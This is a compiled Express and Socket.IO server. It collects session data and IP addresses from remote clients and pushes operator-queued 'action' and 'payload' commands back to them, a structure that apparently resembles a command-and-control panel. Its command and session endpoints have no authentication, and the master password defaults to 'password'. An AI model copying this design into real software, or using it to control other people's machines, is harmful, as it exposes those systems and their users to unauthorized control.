"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const http_1 = require("http");
const socket_io_1 = require("socket.io");
const path_1 = __importDefault(require("path"));
const cors_1 = __importDefault(require("cors"));
const helmet_1 = __importDefault(require("helmet"));
const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
const db = __importStar(require("./db"));
const app = (0, express_1.default)();
const httpServer = (0, http_1.createServer)(app);
const io = new socket_io_1.Server(httpServer, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});
const PORT = process.env.PORT || 8080;
const MASTER_PASSWORD = process.env.MASTER_PASSWORD || 'password';
app.use((0, helmet_1.default)({
    contentSecurityPolicy: false
}));
app.use((0, cors_1.default)());
app.use(express_1.default.json({ limit: '1mb' }));
const apiLimiter = (0, express_rate_limit_1.default)({
    windowMs: 15 * 60 * 1000,
    max: 500
});
app.use('/api/', apiLimiter);
io.on('connection', (socket) => {
    console.log('[Socket] Client connected:', socket.id);
    socket.on('join', (sessionId) => {
        socket.join(sessionId);
        console.log(`[Socket] ${socket.id} joined session room: ${sessionId}`);
    });
    socket.on('disconnect', () => {
        console.log('[Socket] Client disconnected:', socket.id);
    });
});
app.post('/api/sync', async (req, res) => {
    try {
        const data = req.body;
        if (!data || !data.sessionId) {
            return res.status(400).json({ error: 'Missing sessionId' });
        }
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
        await db.upsertSession(data.sessionId, data, ip);
        io.emit('sessions-updated');
        const cmd = await db.getCommand(data.sessionId);
        if (cmd) {
            io.to(data.sessionId).emit('command', cmd);
            return res.json({ status: 'ok', command: cmd });
        }
        res.json({ status: 'ok' });
    }
    catch (e) {
        console.error('[Sync] Error:', e);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});
app.get('/api/sessions', async (req, res) => {
    try {
        const sessions = await db.getAllSessions();
        res.json(sessions);
    }
    catch (e) {
        res.status(500).json([]);
    }
});
app.post('/api/command', async (req, res) => {
    try {
        const { sessionId, action, payload } = req.body;
        if (!sessionId || !action) {
            return res.status(400).send('Invalid Command');
        }
        await db.queueCommand(sessionId, action, payload);
        io.to(sessionId).emit('command', { action, payload });
        res.json({ status: 'queued' });
    }
    catch (e) {
        res.status(500).send('Error queuing command');
    }
});
app.post('/api/gate-unlock', (req, res) => {
    const { password } = req.body;
    if (password === MASTER_PASSWORD) {
        res.json({ success: true });
    }
    else {
        res.status(401).json({ success: false });
    }
});
const staticPath = path_1.default.join(__dirname, '../static');
app.use(express_1.default.static(staticPath));
app.get('*', (req, res) => {
    res.sendFile(path_1.default.join(staticPath, 'index.html'), (err) => {
        if (err) {
            res.status(404).send('Frontend not built. Run npm run build.');
        }
    });
});
httpServer.listen(PORT, () => {
    console.log(`[Server] ✅ Express + Socket.IO running on port ${PORT}`);
});
//# sourceMappingURL=index.js.map